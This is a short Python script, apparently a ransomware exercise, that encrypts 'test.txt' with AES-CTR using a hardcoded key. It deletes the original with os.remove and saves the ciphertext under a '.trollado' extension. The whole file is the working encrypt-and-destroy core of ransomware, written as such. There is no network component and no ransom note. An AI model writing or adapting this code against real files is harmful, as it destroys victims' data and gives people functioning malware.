import os
import pyaes

file_name = "test.txt"
file = open(file_name, 'rb')
file_data = file.read()
file.close()

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

os.remove(file_name)
new_file = file_name + ".trollado"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
